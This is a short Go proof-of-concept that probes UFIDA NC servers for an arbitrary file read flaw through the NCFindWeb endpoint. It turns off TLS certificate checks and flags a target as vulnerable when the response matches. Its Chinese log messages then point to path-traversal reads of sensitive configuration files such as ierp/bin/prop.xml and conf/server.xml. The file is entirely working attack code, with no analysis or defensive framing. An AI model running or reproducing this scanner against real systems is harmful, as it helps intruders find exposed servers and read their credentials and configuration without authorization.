package poc

import (
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func UFIDAReadAnyFile(target string) {
	url := strings.TrimRight(target, "/")
	req, _ := http.NewRequest("GET", url+"/NCFindWeb?service=IPreAlertConfigService&filename=", nil)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("请求发送失败:", err)
		return
	}
	defer resp.Body.Close()
	respbody, _ := io.ReadAll(resp.Body)
	msg := regexp.MustCompile("index.jsp").MatchString(string(respbody))
	if resp.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在UFIDA任意文件读取漏洞,漏洞地址：", url+"/NCFindWeb?service=IPreAlertConfigService&filename=")
		log.Println("[+] 敏感信息文件：../../ierp/bin/prop.xml\t../../conf/server.xml")
	} else {
		log.Println("[-] 不存在UFIDA任意文件读取漏洞")
	}

}
